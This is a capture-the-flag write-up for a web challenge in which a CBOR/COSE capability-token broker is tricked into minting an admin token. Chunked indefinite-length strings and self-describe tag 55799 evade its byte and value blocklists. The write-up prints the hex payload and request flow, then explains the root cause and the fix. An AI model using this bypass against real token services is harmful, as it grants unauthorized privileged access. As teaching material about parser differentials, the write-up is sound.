# Canonical Sin

**Event:** CryoVault CTF 2026
**Category:** web
**Flag:** `isfcr{c4n0n1c4l_d1ff3r3nt14l_t4g_55799_1s_th3_s3lf_d3scr1b3_tr4p_2ec4}`

---

## 1. Recon

The root path advertises a two-service "capability broker":

```
$ curl -s https://isfcrpesu-canonical-sin.chals.io/
Capability Broker

Routes:
  /auth/*   -> auth-gw
  /vault/*  -> vault-api

Start with:  POST /auth/login  { "username": "guest", "password": "guest123" }
```

Logging in returns a **CBOR / COSE-Sign1 style** token - three base64url parts
(`header.payload.signature`), where header and payload are CBOR maps:

```json
POST /auth/login {"username":"guest","password":"guest123"}
-> {"token":"<b64u>.<b64u>.<b64u>","expires_in":900}
```

Decoding the parts (cbor2):

```
header : { 1: -8, 4: "main-2026-01" }      # 1=alg (COSE EdDSA), 4=kid
payload: { "sub":"guest", "iat":..., "exp":..., "role":"user", "caps":["read:profile"] }
signature: 64 bytes
```

`GET /auth/keys` publishes the verification key:

```json
{"keys":[{"kty":"OKP","crv":"Ed25519","use":"sig","alg":"EdDSA",
          "kid":"main-2026-01","x":"j0TFvgtX-921XWIiHxkYnbOIWqEfris21TcpXjF0IJI"}]}
```

The signature is a genuine **COSE `Signature1`** structure over the *raw*
protected-header and payload bytes:

```
Sig_structure = CBOR(["Signature1", hdr_bytes, b"", payload_bytes])
```

This was confirmed by reproducing the Ed25519 verification locally. Tampering
with any byte (header, payload, or signature) yields `bad signature`; the
validator does **not** canonicalize before verifying, so there is no signature
forgery available. The attack is elsewhere.

## 2. Mapping the vault

```
GET /vault/list
{"entries":[
  {"name":"welcome","requires_cap":"read:profile","requires_role":"user"},
  {"name":"flag","requires_cap":"read:vault","requires_role":"admin"}]}
```

The read route is not linked anywhere and had to be found by fuzzing
(`/vault/secret/<name>`):

```
GET /vault/secret/welcome  (guest token) -> "Welcome, guest. ..."
GET /vault/secret/flag     (guest token) -> 403
   {"error":"forbidden: role must be 'admin'","your_role_repr":"'user'"}
```

So the gate is `role == 'admin'` (plus capability `read:vault`).

## 3. The real surface: `/auth/mint`

A method-specific route missed by GET fuzzing:

```
POST /auth/mint   (requires bearer token)
{"extra_claims_b64u":"<base64url(CBOR map of extra claims)>"}
```

`/auth/mint` takes the caller's base claims (`sub`, `iat`, `exp`) and merges in
**attacker-supplied claims**, then re-signs a fresh token with the broker key.
This is the capability broker "minting" a derived capability token - and it is
where the vulnerability lives.

The mint endpoint applies several filters to `extra_claims`:

* **A. Raw-byte blocklist** - rejects if the literal bytes `admin`, `root`,
  `superuser`, … appear anywhere in the encoded claims:
  `{"error":"extra_claims bytes contain forbidden token \"admin\""}`
* **B. Decoded-value blocklist** - case-insensitive scan of decoded values:
  `{"error":"extra_claims contain a forbidden role literal"}` (caught `"ADMIN"`).
* **C. Semantic role check** - a *text string* role must be `"user"`;
  non-string "structured claim objects" are allowed:
  `{"error":"role \"moderator\" is not permitted"}` /
  `{"error":"role must be a text string or a structured claim object"}`

Capabilities, by contrast, are free: `{"caps":["read:vault"]}` mints cleanly.
The only obstacle is getting `role == "admin"` past filters A/B/C.

## 4. Exploit - two CBOR canonicalization tricks

The title is the hint: *canonical* CBOR. Two deviations from canonical CBOR
each defeat a different filter, and together they smuggle `admin` through.

### 4a. Indefinite-length string to beat the byte scan (A)

Encode `"admin"` as an **indefinite-length** CBOR text string split into chunks:

```
7f 63 "adm" 62 "in" ff      -> decodes to "admin"
```

The raw bytes now contain `adm` and `in` but never the contiguous ASCII
`admin`, so the byte-level blocklist (A) misses it. (A definite string
`65 61646d696e` is rejected immediately.)

### 4b. CBOR tag 55799 to beat the decoded-value scan (B) and the role check (C)

Tag **55799** is the "self-describe CBOR" marker. `cbor2` (and most decoders)
transparently **unwrap** it to the bare value on decode:

```python
cbor2.loads(bytes.fromhex("d9d9f7") + b"\x65admin")   # -> 'admin'  (plain str)
```

Wrapping the value in `55799` makes the mint filter treat the claim as a
*structured object* (so the string-role check C is skipped and the value scan B
does not see a bare string literal), while the decoder that builds the final
token payload unwraps it back to the string `'admin'`.

### 4c. Poisoned extra claims

```
map(2):
  "role" -> tag55799( indef("adm"+"in") )     # decodes to "admin", raw bytes clean
  "caps" -> ["read:vault"]

raw hex:
a2 64726f6c65 d9d9f7 7f6361646d62696eff 6463617073 81 6a726561643a7661756c74
         ^"role"  ^tag55799 ^indef "admin"  ^"caps"   ^["read:vault"]
```

`b"admin" in raw` is **False** → filter A passes. The tagged item is treated as
a structured claim → filters B/C pass. The broker re-signs it, and the token
payload decodes to:

```python
{'sub':'guest','iat':...,'exp':...,'role':'admin','caps':['read:vault']}
```

### 4d. Claim the flag

```
POST /auth/mint  -> 200, new signed token (role=admin, caps=[read:vault])
GET  /vault/secret/flag  -> 200
isfcr{c4n0n1c4l_d1ff3r3nt14l_t4g_55799_1s_th3_s3lf_d3scr1b3_tr4p_2ec4}
```

The flag text spells out the intended lesson: a **canonical differential** -
`tag 55799` (self-describe) is the trap.

## 5. Why it works (root cause)

`/auth/mint` performs **validate-then-reserialize** with a decoder/filter pair
that disagrees on non-canonical CBOR:

* The *filters* inspect raw bytes and/or decoded values under assumptions that
  hold only for canonical encodings (contiguous string bytes, bare values).
* The *serializer* uses a full CBOR decoder that normalizes the item (unwraps
  tag 55799, concatenates indefinite-length chunks) into a form the downstream
  `vault-api` treats as the privileged value.

Any one of the three defences is bypassable individually; combined, the
indefinite-length string hides the literal from the byte scan and tag 55799
hides it from the value/type scan. The fix is to **canonicalize once, validate
the canonical form, and sign exactly that form** (RFC 8949 §3.9 / §4.2), and to
reject tags and indefinite-length items in a security-sensitive token.

## 6. Reproduction

```bash
pip install --break-system-packages cbor2 requests
python3 exploit.py
# -> isfcr{c4n0n1c4l_d1ff3r3nt14l_t4g_55799_1s_th3_s3lf_d3scr1b3_tr4p_2ec4}
```

